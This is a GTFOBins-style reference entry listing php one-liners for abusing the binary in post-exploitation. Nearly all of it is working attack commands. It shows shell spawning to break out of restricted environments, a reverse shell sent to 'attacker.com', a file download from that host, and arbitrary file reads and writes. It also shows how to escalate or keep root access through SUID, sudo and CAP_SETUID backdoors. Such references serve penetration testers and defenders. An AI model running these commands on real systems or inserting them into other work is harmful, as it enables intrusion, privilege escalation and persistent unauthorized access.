# GTFOBin: php

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

```
export CMD="/bin/sh"
php -r 'system(getenv("CMD"));'
```

```
export CMD="/bin/sh"
php -r 'passthru(getenv("CMD"));'
```

```
export CMD="/bin/sh"
php -r 'print(shell_exec(getenv("CMD")));'
```

```
export CMD="/bin/sh"
php -r '$r=array(); exec(getenv("CMD"), $r); print(join("\\n",$r));'
```

```
export CMD="/bin/sh"
php -r '$h=@popen(getenv("CMD"),"r"); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'
```

## Command

It can be used to break out from restricted environments by running non-interactive system commands.

```
export CMD="id"
php -r '$p = array(array("pipe","r"),array("pipe","w"),array("pipe", "w"));$h = @proc_open(getenv("CMD"), $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'
```

## Reverse shell

It can send back a reverse shell to a listening attacker to open a remote network access.

Run `nc -l -p 12345` on the attacker box to receive the shell.

```
export RHOST=attacker.com
export RPORT=12345
php -r '$sock=fsockopen(getenv("RHOST"),getenv("RPORT"));exec("/bin/sh -i <&3 >&3 2>&3");'
```

## File upload

It can exfiltrate files on the network.

Serve files in the local folder running an HTTP server. This requires PHP version 5.4 or later.

```
LHOST=0.0.0.0
LPORT=8888
php -S $LHOST:$LPORT
```

## File download

It can download remote files.

Fetch a remote file via HTTP GET request.

```
export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
php -r '$c=file_get_contents(getenv("URL"));file_put_contents(getenv("LFILE"), $c);'
```

## File write

It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.

write data to a file, filename should be absolute.

```
export LFILE=file_to_write
php -r 'file_put_contents(getenv("LFILE"), "DATA");'
```

## File read

It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

```
export LFILE=file_to_read
php -r 'readfile(getenv("LFILE"));'
```

## SUID

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

```
sudo install -m =xs $(which php) .

CMD="/bin/sh"
./php -r "pcntl_exec('/bin/sh', ['-p']);"
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
CMD="/bin/sh"
sudo php -r "system('$CMD');"
```

## Capabilities

If the binary has the Linux `CAP_SETUID` capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.

```
cp $(which php) .
sudo setcap cap_setuid+ep php

CMD="/bin/sh"
./php -r "posix_setuid(0); system('$CMD');"
```